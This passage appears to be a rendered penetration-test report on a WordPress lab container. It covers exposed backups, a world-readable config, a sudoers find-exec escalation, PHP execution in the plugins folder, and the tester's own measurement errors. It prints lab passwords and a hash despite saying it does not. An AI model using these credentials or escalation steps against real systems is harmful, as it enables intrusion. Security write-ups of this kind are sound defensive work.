+unaffected — every finding lives in the plugin (5.16.2), the OS/sudoers layer, or a file in
+the docroot, none of which depend on the core version — but a re-run will not reproduce the
+same core, and a writeup claiming a version must say <em>which</em> one it measured and how.</p>
+<p>Also worth noting: <code>restore from the image</code> does <strong>not</strong> produce a stable target here. The
+restored container re-upgrades on its first request. Positive restore verification is
+therefore about <em>file</em> state, not version state.</p>
+<hr />
+<h2 id="8-findings">8. Findings</h2>
+<h3 id="f1--database-backup-with-a-plaintext-administrator-credential-served-from-the-document-root">F1 — Database backup with a plaintext administrator credential, served from the document root</h3>
+<p><strong>CWE-312 / CWE-538 · Critical</strong></p>
+<p><code>/var/www/html/backups/databaseback2may.zip</code>, mode <code>drwxr-xr-x root root</code>, inside the served
+<code>DocumentRoot</code>. Fetched unauthenticated:</p>
+<pre><code>200 241 bytes application/zip
+$ unzip -p backup.zip 29DBMay
+| Username  |         Password        |
+| developer | 2wmy3KrGDRD%RsA7Ty5n71L^|
+</code></pre>
+<p>Confirmed as <em>the</em> credential, not merely a plausible one:</p>
+<pre><code>user=developer id=2
+hash=$P$BzAMjXlNoyyZOosXmEWO26twlzEhDs.
+roles=administrator
+has_cap manage_options=true
+wp_check_password(disclosed, stolen_hash) = bool(true)
+NEGATIVE CONTROL (wrong pw)               = bool(false)
+</code></pre>
+<p><strong>Impact:</strong> immediate full administrative takeover. No exploitation, no prior access.
+Note this is the <em>same defect class</em> as lab 90's F3 (a credential disclosed by a
+misconfiguration) reached by a different mechanism — a leftover backup artefact instead of a
+second virtual host — which is the strongest argument for a WordPress section built on
+platform facts rather than on per-lab CVEs.</p>
+<p><strong>Remediation:</strong> never store backups under a served document root. Exclude the path at the
+web-server layer <em>and</em> at the deploy pipeline. Rotate the credential — anything that has
+existed in a served archive must be considered disclosed. Add a CI check that fails when a
+<code>.zip</code>/<code>.sql</code>/<code>.tar</code> appears beneath the web root.</p>
+<h3 id="f2--world-readable-wp-configphp-exposes-the-database-credential-to-any-local-account">F2 — World-readable <code>wp-config.php</code> exposes the database credential to any local account</h3>
+<p><strong>CWE-522 / CWE-276 · High</strong></p>
+<pre><code>-rw-r--r-- 1 root root 3118 /var/www/html/wp-config.php
+$ (as rafa)  grep DB_PASSWORD /var/www/html/wp-config.php
+define( 'DB_PASSWORD', 'QnnLf5i84KNX2eT' );
+</code></pre>
+<p>Proven by reading it <em>as the escalated identity</em>, not by inferring it from the mode.
+Independent of F1 and reachable by any non-root account, including the <code>ruben</code> account the
+ladder never reaches.</p>
+<p><strong>Remediation:</strong> <code>chmod 640 wp-config.php</code>, owned by the web-server user and a deploy group;
+better, move it outside the document root entirely.</p>
+<h3 id="f3--sudoers-grants-www-data-a-shell-as-rafa-two-of-three-rungs-are-dead">F3 — <code>sudoers</code> grants <code>www-data</code> a shell as <code>rafa</code> (two of three rungs are dead)</h3>
+<p><strong>CWE-269 / CWE-250 · High (rung 1) / Informational (rungs 2-3 unavailable)</strong></p>
+<pre><code>/etc/sudoers:49  www-data ALL=(rafa) NOPASSWD: /usr/bin/find
+</code></pre>
+<p><code>find</code> accepts <code>-exec</code>, so this is an unrestricted shell as <code>rafa</code> for anyone who can write a
+PHP file — i.e. it converts every web RCE into a privilege escalation. Rungs 51 and 53 are
+present but not exploitable in this container (§5).</p>
+<p><strong>Remediation:</strong> drop the <code>find</code> grant, or replace it with a fixed-argument wrapper
+(<code>/usr/local/bin/reindex</code> that runs a fixed command and takes no caller-controlled options).
+If a chain is genuinely required, constrain <em>every</em> rung's arguments, and never ship a chain
+whose middle rung depends on a resource (<code>/dev/*</code>) the deployment does not provide.</p>
+<h3 id="f4--php-execution-is-not-confined-away-from-wp-contentplugins">F4 — PHP execution is not confined away from <code>wp-content/plugins</code></h3>
+<p><strong>CWE-434 (consequence) · Medium</strong></p>
+<p>A payload written into <code>wp-content/plugins/hello.php</code> executed immediately, without
+activation, because Apache routes that directory through the PHP handler. Activation is
+irrelevant to execution.</p>
+<p><strong>Remediation:</strong> <code>php_admin_flag engine off</code> on <code>wp-content/uploads</code> (and any other
+non-code directory), and consider <code>DISALLOW_FILE_EDIT</code> / <code>DISALLOW_FILE_MODS</code> in
+<code>wp-config.php</code> — neither is set here.</p>
+<h3 id="f5--wp_homewp_siteurl-taken-from-_serverserver_addr">F5 — <code>WP_HOME</code>/<code>WP_SITEURL</code> taken from <code>$_SERVER['SERVER_ADDR']</code></h3>
+<p><strong>CWE-441 (unintended proxy/intermediary-style misconfiguration) · Low</strong></p>
+<pre><code class="language-php">wp-config.php:40-41
+define('WP_HOME',    'http://' . $_SERVER['SERVER_ADDR']);
+define('WP_SITEURL', 'http://' . $_SERVER['SERVER_ADDR']);
+</code></pre>
+<p>The stored <code>siteurl</code>/<code>home</code> options are inert; <code>COOKIEHASH</code> therefore tracks the host's
+interface address (§3.1), and in any context without <code>SERVER_ADDR</code> the site URL collapses to
+<code>http://</code> — producing a <em>different</em> cookie namespace, visible as a flood of
+<code>Undefined array key &quot;SERVER_ADDR&quot;</code> in the error log on every CLI invocation of
+<code>wp-load.php</code>. Not attacker-controlled via <code>Host:</code> (that is <code>HTTP_HOST</code>, a different
+variable), so this is robustness and hygiene rather than a takeover path — but it makes
+sessions non-portable and hides the real site URL from anyone reading the database.</p>
+<p><strong>Remediation:</strong> hardcode the two constants to the real URL; set them in the config, not from
+request state.</p>
+<h3 id="f6--wp-configphp-ships-the-default-placeholder-auth-keys-and-salts">F6 — <code>wp-config.php</code> ships the default placeholder auth keys and salts</h3>
+<p><strong>CWE-1188 · Low here, high in general — and the reason is the interesting part</strong></p>
+<p><code>wp-config.php:54-61</code> are all <code>'put your unique phrase here'</code>. <strong>This is not exploitable in
+this lab</strong>, because <code>pluggable.php:2614/2638</code> detects the placeholder and falls back to random
+values in <code>wp_options</code>, and because an attacker additionally needs a live session token
+(<code>pluggable.php:889</code>). My offline forgery from the placeholder was rejected (§3.3).</p>
+<p>It is reported because it is a <strong>trap that inverts the usual sign</strong>: a tester who reads
+<code>wp-config.php</code> concludes the opposite of the truth. Any write-up that says &quot;default salts&quot;
+on the strength of <code>wp-config.php</code> alone is wrong.</p>
+<p><strong>Remediation:</strong> still generate real salts and put them in <code>wp-config.php</code>; do not rely on
+the DB fallback, and do not let the two disagree.</p>
+<h3 id="f7--wordpress-core-auto-updates-against-live-egress">F7 — WordPress core auto-updates against live egress</h3>
+<p><strong>CWE-1104 (use of unmaintained third-party components) / operational hazard · Medium</strong></p>
+<p>No <code>AUTOMATIC_UPDATER_DISABLED</code>, and the container reaches <code>api.wordpress.org</code>, so core
+upgraded itself from 6.5.4 to 7.1.2 during the engagement (§7). The lab's own artefacts —
+MEC 5.16.2, published January 2021 — are then running on a core nine major versions newer,
+with no test having been performed.</p>
+<p><strong>Remediation:</strong> pin the core version in lab images; disable auto-update in the image build;
+if egress is wanted, allow it only for the attacker tooling, not the target.</p>
+<h3 id="f8--unauthenticated-user-enumeration-via-two-disagreeing-surfaces">F8 — Unauthenticated user enumeration via two disagreeing surfaces</h3>
+<p><strong>CWE-203 · Low</strong></p>
+<p><code>?author=N</code> discloses both accounts; the login form distinguishes &quot;not registered&quot; from
+&quot;incorrect password&quot; by message; REST <code>/wp/v2/users</code> discloses only accounts with published
+posts, so it <em>under</em>-reports relative to <code>?author=</code>. None is a vulnerability on its own; the
+combination is what makes the account list reliable enough to target.</p>
+<p><strong>Remediation:</strong> this is core WordPress behaviour. <code>?author=</code> suppression is cosmetic and
+removable by plugins; the practical mitigation is not publishing author archives.</p>
+<hr />
+<h2 id="9-controls-that-held">9. Controls that held</h2>
+<p>Every row has a positive control, i.e. a case where the same detector was shown firing.</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Control</th>
+<th>Positive control that proves the detector works</th>
+<th>Negative evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C1</td>
+<td>Author enumeration discloses logins</td>
+<td><code>?author=1</code> → 301 <code>/author/erik/</code>; <code>?author=2</code> → body title <code>developer</code></td>
+<td><code>?author=3</code>, <code>?author=9999</code> → 404</td>
+</tr>
+<tr>
+<td>C2</td>
+<td>MEC nonce rejects forged nonces</td>
+<td>bad nonce → <code>{&quot;code&quot;:&quot;NONCE_IS_INVALID&quot;}</code></td>
+<td>offline-computed nonce from the placeholder salt → also rejected</td>
+</tr>
+<tr>
+<td>C3</td>
+<td><code>fes_upload</code> refuses on nonce failure</td>
+<td><code>uploads/</code> contains <strong>nothing</strong> after two bad-nonce posts</td>
+<td><code>main.php:1609</code> <code>exit</code> confirmed in source</td>
+</tr>
+<tr>
+<td>C4</td>
+<td>Credential oracle can succeed</td>
+<td><code>wp_check_password(disclosed, stolen_hash)</code> = <code>bool(true)</code></td>
+<td>wrong value = <code>bool(false)</code></td>
+</tr>
+<tr>
+<td>C5</td>
+<td>Login oracle discriminates</td>
+<td>correct password → 302 + session cookies + <code>Howdy, developer</code></td>
+<td>wrong password → 200 + &quot;password ... is incorrect&quot;</td>
+</tr>
+<tr>
+<td>C6</td>
+<td>Plugin editor rejects a bad nonce</td>
+<td>good nonce → mtime advances, size 2578 → 118</td>
+<td>bad nonce → <code>nonce_failure</code>, mtime unchanged</td>
+</tr>
+<tr>
+<td>C7</td>
+<td>REST requires auth for writes</td>
+<td><code>POST /wp/v2/posts</code> unauth → <strong>401</strong></td>
+<td>—</td>
+</tr>
+<tr>
+<td>C8</td>
+<td><code>[wordpress-session-cookie]</code> alone is not auth</td>
+<td>both cookies → 200</td>
+<td>logged_in alone → 302; tampered HMAC → 302; no cookies → 302</td>
+</tr>
+<tr>
+<td>C9</td>
+<td><code>sudoers</code> is genuinely restrictive</td>
+<td>www-data → rafa via the exact <code>find</code> binary succeeds</td>
+<td>www-data → ruben, and rafa → <code>sh</code>, both → <code>sudo: a password is required</code></td>
+</tr>
+<tr>
+<td>C10</td>
+<td>Database is not reachable as the web identity</td>
+<td>root DB access from the container works (used for ground truth)</td>
+<td><code>www-data</code> → <code>mysql -u root</code> → <code>ERROR 1698 (28000): Access denied</code></td>
+</tr>
+<tr>
+<td>C11</td>
+<td>No writable-file privesc surface</td>
+<td>—</td>
+<td><code>find -writable</code> <strong>and</strong> <code>find -perm -u+w</code> as <code>rafa</code> both return empty, agreeing</td>
+</tr>
+</tbody>
+</table>
+<p>On C11: this image has GNU findutils, so <code>find -writable</code> is a real option here and both
+spellings were run in the same shell precisely because the busybox variant of that flag
+returns usage and exits 0. Two tools, same answer.</p>
+<hr />
+<h2 id="10-not-tested-scope-not-gaps-in-effort">10. NOT tested (scope, not gaps in effort)</h2>
+<ul>
+<li><strong>Offline cracking beyond the corpora.</strong> 517,506-line corpus × 2 users = 1,035,006
+<code>CheckPassword</code> calls, exhausted, 0 hits; plus 499 generated and 1,997 lab-themed
+candidates. Not tried: a GPU cracker, a much larger corpus, or a rules-based attack.
+This is a limit of available tooling, <strong>not</strong> evidence the password is uncrackable — and
+it turned out to be moot, since the credential was disclosed in plaintext (F1).</li>
+<li><strong>Any behaviour specific to WordPress 6.5.4.</strong> Everything from minute ~13 onward ran on the
+self-updated 7.1.2 (§7). Whether the plugin editor, the REST auth gate, or the nonce
+fallback behave identically on 6.5.4 was not checked.</li>
+<li><strong>Rung 9 beyond the three blockers.</strong> I did not attempt to create a filesystem image and
+run <code>debugfs -w</code> against it, because doing so grants nothing: the image would be owned by
+the caller, and <code>debugfs</code> bypasses DAC only on filesystems it should not be able to reach.</li>
+<li><strong>Whether <code>/opt/penguin.sh</code> is injectable by <code>ruben</code>.</strong> Its <code>[[ $num -eq 42 ]]</code> compares an
+attacker-influenced value in an arithmetic context, which is worth examining. <code>ruben</code> was
+never obtained, so this is untested and <strong>not</strong> claimed.</li>
+</ul>
+<h2 id="11-discarded-with-reason">11. Discarded with reason</h2>
+<table>
+<thead>
+<tr>
+<th>Hypothesis</th>
+<th>Why discarded</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2021-24145-style unauth upload via <code>mec_fes_upload_featured_image</code></td>
+<td>Nonce keyed on the DB-random <code>nonce_key</code>; extension allowlist (<code>fes.php:363-369</code>); <code>wp_handle_upload</code> re-checks type. Forgery attempted and rejected.</td>
+</tr>
+<tr>
+<td><code>[wordpress-session-cookie]</code> as a SQLi carrier (the lab 90 vector)</td>
+<td><code>grep -rn [wordpress-session-cookie] wp-content/plugins/</code> → <strong>zero hits</strong>. No plugin here consumes that cookie.</td>
+</tr>
+<tr>
+<td>Forgeable auth/nonce cookies from default salts in <code>wp-config.php</code></td>
+<td><code>pluggable.php:2614</code> detects the placeholder and falls back to DB keys; forgery rejected; <code>pluggable.php:889</code> additionally requires a live session token.</td>
+</tr>
+<tr>
+<td><code>hide-my-wp</code>-style path renaming</td>
+<td><code>/wp-login.php</code> → 200, <code>/wp-admin/</code> → 302. Canonical paths; nothing is renamed.</td>
+</tr>
+<tr>
+<td>Second vhost disclosing a credential (lab 90's F3 mechanism)</td>
+<td>Only <code>000-default.conf</code> exists, one <code>DocumentRoot</code>. No second host exists.</td>
+</tr>
+<tr>
+<td><code>debugfs</code> block-device privesc</td>
+<td>Attempted and refuted: no device node in <code>/dev</code>, <code>mknod</code> → <code>EPERM</code>, binary root-owned (§5).</td>
+</tr>
+<tr>
+<td><code>auth_pam_tool</code> SUID (CVE-2022-24407 shape)</td>
+<td>Present, but it lives in <code>/usr/lib/mysql/plugin/auth_pam_tool_dir</code>, mode <code>0700 mysql:root</code>. Neither <code>www-data</code> nor <code>rafa</code> can traverse it.</td>
+</tr>
+<tr>
+<td>PHP fatal-error rollback as the cause of the editor failure</td>
+<td>Ruled out by reading <code>wp_edit_theme_plugin_file</code>: the loopback check is gated on <code>$is_active</code>, and <code>hello.php</code> is inactive. The real cause was my POST fields (§12).</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="12-instrumentation-defects">12. Instrumentation defects</h2>
+<p>Six, and several of them nearly became findings.</p>
+<p><strong>12.1 The target changed version under me (worst one).</strong> <code>6.5.4</code> → <code>7.1.2</code> mid-engagement.
+A write-up stating &quot;WordPress 6.5.4&quot; would have been wrong about the running system. Caught
+only by noticing a <code>grep</code> result disagree with an earlier one and then checking file mtimes
+against the image. <em>Rule: record the version, the moment you read it, and re-read it at the
+end — and if mtimes inside the docroot disagree with the image, the target is not the thing
+you deployed.</em></p>
+<p><strong>12.2 &quot;Does the plugin editor work?&quot; — a false negative built from my own bad POST.</strong> The
+editor returned <code>200</code> with a generic <em>&quot;There was an error while trying to update the file&quot;</em>
+while the file never changed. Two different mistakes: <code>plugin=hello.php</code> fails
+<code>array_key_exists($plugin, get_plugins())</code> (keys are <code>dir/file</code>), and
+<code>plugin=hello.php/hello.php</code> fails <code>validate_file()</code>. I was one step from reporting &quot;the
+plugin editor is non-functional in 5.16.2/7.1.2&quot;, which is a false claim. The thing that
+saved it was <strong>checking mtime instead of trusting the status code</strong> — the 200 was never
+evidence of anything. <em>Rule: for any write, the artefact's mtime/size is the oracle; the HTTP
+status is not.</em></p>
+<p><strong>12.3 <code>urllib</code> follows redirects, so every authentication test passed.</strong> <code>urlopen</code> followed
+<code>302 → wp-login.php → 200</code>, so &quot;no cookies at all&quot; returned <strong>200</strong>. Had I not run the
+no-cookie control, I would have reported that <code>[wordpress-session-cookie]</code> alone authenticates —
+the exact opposite of the truth (§3.4). Caught by the control returning 200. <em>Rule: when the
+question is &quot;is this request authorised?&quot;, disable redirect following, and always include a
+no-credentials control.</em></p>
+<p><strong>12.4 A zero-work negative, for the second time in this corpus.</strong> <code>file('/dev/stdin')</code> under
+PHP returned <strong>0 lines</strong>, so the cracker reported <code>candidates=0 matches=0</code> — a clean-looking
+negative that tested nothing. This is lab 90's §0.4 defect recurring verbatim, in a different
+harness. Fixed by copying the wordlist into the container and printing the candidate count;
+the real run then reported <code>tested=207000</code> per shard, five shards, all non-zero. <em>Rule: a
+&quot;not found&quot; that reports zero units of work is not a negative. Print the work counter.</em></p>
+<p><strong>12.5 Broken nested <code>sudo</code> quoting manufactured a policy denial.</strong> I ran
+<code>sudo -u www-data sh -c &quot;sudo -u rafa sh -c 'sudo -u ruben ...'&quot;</code>, which collapsed, so every
+inner <code>sudo</code> ran as <code>www-data</code> and returned <code>sudo: a password is required</code>. That reads
+exactly like &quot;the sudoers policy correctly refused me&quot;. It was my own missing hop. Caught by
+printing <code>id</code> at each rung and noticing the identity was <code>www-data</code> where <code>rafa</code> should have
+been. <em>Rule: <code>id</code> at every hop, as that hop's identity — a permission error is only
+meaningful once you know who asked.</em></p>
+<p><strong>12.6 <code>#HttpOnly_</code> prefixes defeated my cookie extraction.</strong> <code>grep -v '^#'</code> silently removed
+the two authentication cookies from the jar, so a test I believed was sending
+<code>[wordpress-session-cookie]</code> alone was in fact sending an empty <code>Cookie:</code> header. The result (302)
+was correct for the wrong reason, and would have supported a claim I had not tested.
+Caught by parsing the jar with a cookie library and printing the actual names.</p>
+<p>None of the six is a defect in the target. All six are defects in how I measured it, which is
+the reason they are listed separately from Findings.</p>
+<hr />
+<h2 id="13-reproducibility">13. Reproducibility</h2>
+<p>Harness files used during the engagement (credential-oracle, sharded cracker, nonce forger,
+editor client, cookie-decision probe) are in <code>/tmp/[tool]/108/</code> on the analysis host and
+are not required to reproduce any result above; every claim is quoted with its <code>file:line</code> or
+its literal response.</p>
+<p>The disclosed administrator credential and the session cookies are deliberately <strong>not</strong>
+reproduced in full here, consistent with the rest of the corpus.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
